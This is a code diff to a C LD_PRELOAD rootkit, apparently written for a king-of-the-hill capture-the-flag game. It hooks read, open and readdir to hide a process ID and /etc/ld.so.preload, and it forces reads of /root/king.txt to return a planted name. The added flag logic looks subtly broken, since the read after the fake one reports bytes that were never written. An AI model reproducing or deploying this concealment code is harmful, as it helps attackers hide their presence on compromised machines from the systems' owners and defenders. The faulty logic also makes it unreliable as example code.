@@ -14,8 +14,14 @@ static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
 static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
 static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
 
-static int target_pid = 333; // Example PID to hide
-static char *target_file = "/etc/ld.so.preload"; // Example file to hide
+// Target file and PID to hide
+static const char *target_file = "/etc/ld.so.preload";
+static const char *target_hidden_file = "/root/king.txt";
+static int target_pid = 333;
+
+// Static buffer to control read modification
+static char read_buffer[256];
+static int is_reading_hidden_file = 0;
 
 // Function to check if the process should be hidden
 static int is_process_hidden(int pid) {
@@ -28,6 +34,11 @@ ssize_t read(int fd, void *buf, size_t count) {
         orig_read = dlsym(RTLD_NEXT, "read");
     }
 
+    if (is_reading_hidden_file) {
+        is_reading_hidden_file = 0; // Reset flag after the read operation
+        return count;
+    }
+
     // Obtain the file path from the file descriptor
     char path[256];
     snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
@@ -36,18 +47,18 @@ ssize_t read(int fd, void *buf, size_t count) {
     if (len != -1) {
         real_path[len] = '\0';
 
-        // Check if it's the target file
-        if (strcmp(real_path, "/root/king.txt") == 0) {
+        // Check if it's the target file for modification
+        if (strcmp(real_path, target_hidden_file) == 0) {
             const char *message = "profxadke\n";
             size_t msg_len = strlen(message);
 
-            // Return the message, but respect the requested count
             if (count > msg_len) {
                 count = msg_len;
             }
 
             // Copy the message to the buffer
             memcpy(buf, message, count);
+            is_reading_hidden_file = 1; // Set flag to avoid infinite loop
             return count; // Return the number of bytes written
         }
 
